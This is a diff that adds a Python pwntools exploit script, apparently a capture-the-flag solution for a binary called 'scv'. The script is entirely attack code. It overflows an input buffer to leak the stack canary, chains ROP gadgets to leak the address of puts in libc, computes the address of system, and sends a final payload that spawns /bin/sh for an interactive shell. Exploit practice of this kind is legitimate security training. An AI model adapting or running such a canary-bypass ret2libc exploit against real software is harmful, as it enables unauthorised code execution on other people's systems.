@@ -1,0 +1,136 @@
+from pwn import *
+import struct
+import copy
+scv = ELF('./scv')
+libc = ELF('./libc-2.23.so')
+p = process("./scv")
+#gdb.attach(p,'''
+#b *0x0000000000400bf9
+#b *0x0000000000400d74
+#b *0x0000000000400dc5
+#b *0x0000000000400ea3
+#''')
+
+
+s = "aaaaaaaa"*20 + "aaaaaaaa"
+p.recvuntil("3.MINE MINERALS....\n")
+p.recvuntil("-------------------------\n")
+p.sendline("1")
+p.recvuntil("[*]GIVE HIM SOME FOOD.......\n-------------------------\n")
+p.sendline(s)
+p.recvuntil("3.MINE MINERALS....\n")
+p.recvuntil("-------------------------\n")
+p.sendline("2")
+p.recvuntil("[*]PLEASE TREAT HIM WELL.....\n-------------------------\n")
+print p.recvuntil("\n")
+a = p.recvuntil("\n")
+print a
+print a.encode('hex')
+a = "\x00"+a[:7] 
+print a
+print a.encode('hex')
+
+p_rdi_ret = 0x0000000000400ea3
+puts_addr = 0x00000000004008d0
+#select_input = 0x0000000000400bea
+select_input = 0x00000000004009a0
+
+
+
+q =  struct.pack('<Q',p_rdi_ret)
+q += struct.pack('<Q',puts_addr + 0x201742 + 2 + 4)
+q += struct.pack('<Q',puts_addr)
+q += (struct.pack('<Q',select_input) * 3)
+print q.encode('hex')
+
+s += a + "aaaaaaaa"
+
+p.recvuntil("3.MINE MINERALS....\n")
+p.recvuntil("-------------------------\n")
+p.sendline("1")
+p.recvuntil("[*]GIVE HIM SOME FOOD.......\n-------------------------\n")
+p.sendline(s+q)
+p.recvuntil("3.MINE MINERALS....\n")
+p.recvuntil("-------------------------\n")
+#p.sendline("2")
+#p.recvuntil("[*]PLEASE TREAT HIM WELL.....\n-------------------------\n")
+#print p.recvuntil("\n")
+#p.recvuntil("3.MINE MINERALS....\n")
+#print p.recvuntil("-------------------------\n")
+p.sendline("3")
+print p.recvuntil("TIME TO MINE MIENRALS...\n")
+   
+
+
+
+
+puts_leak = p.recvuntil("\n").replace("\n","")
+
+if len(puts_leak) < 8:
+    puts_leak += "\x00" * (8-len(puts_leak))
+elif len(puts_leak) > 8:
+    puts_leak = puts_leak[0:8]
+    
+print puts_leak
+print puts_leak.encode('hex')
+puts_leak_int = struct.unpack("<Q",puts_leak)[0]
+puts_libc = libc.symbols['puts']
+sys_call = libc.symbols['system']
+print puts_libc
+libc_addr = puts_leak_int - puts_libc
+sys_addr = libc_addr + sys_call
+bash_addr = libc_addr + 0x18cd17
+bash_addr_str = struct.pack("<Q",bash_addr)
+print libc_addr
+libc_addr_str = struct.pack("<Q",sys_addr)
+print libc_addr_str
+print libc_addr_str.encode('hex')
+
+ss = "aaaaaaaa"*19 + "aaaaaaa"
+p.sendline("1")
+p.recvuntil("[*]GIVE HIM SOME FOOD.......\n-------------------------\n")
+p.sendline(ss)
+p.recvuntil("3.MINE MINERALS....\n")
+p.recvuntil("-------------------------\n")
+p.sendline("2")
+p.recvuntil("[*]PLEASE TREAT HIM WELL.....\n-------------------------\n")
+print p.recvuntil("\n")
+mem_leak = p.recvuntil("\n").replace("\n","")
+mem_leak += "\x00" * (8-len(mem_leak))
+print mem_leak
+print mem_leak.encode('hex')
+m = struct.unpack("<Q",mem_leak)[0]
+m = m - 0x1b0
+mem_leak = struct.pack("<Q",m)
+mem_leak2 = struct.pack(">Q",m)
+print mem_leak2
+print "MEM LEAK"
+print mem_leak2.encode('hex')
+
+
+
+r = struct.pack('<Q',p_rdi_ret)
+r += bash_addr_str
+r += libc_addr_str
+s = s[0:16*9] + "/bin/sh\x00" + s[16*9+8:] 
+p.recvuntil("3.MINE MINERALS....\n")
+p.recvuntil("-------------------------\n")
+p.sendline("1")
+print p.recvuntil("[*]GIVE HIM SOME FOOD.......\n-------------------------\n")
+p.sendline(s+r)
+p.recvuntil("3.MINE MINERALS....\n")
+p.recvuntil("-------------------------\n")
+#p.sendline("2")
+#p.recvuntil("[*]PLEASE TREAT HIM WELL.....\n-------------------------\n")
+#print p.recvuntil("\n")
+#p.recvuntil("3.MINE MINERALS....\n")
+#print p.recvuntil("-------------------------\n")
+p.sendline("3")
+print p.recvuntil("TIME TO MINE MIENRALS...\n")
+
+#rop = ROP(libc)
+#rop.system(next(libc.search("/bin/sh\x00")))
+#print rop.dump()
+
+p.interactive()
+
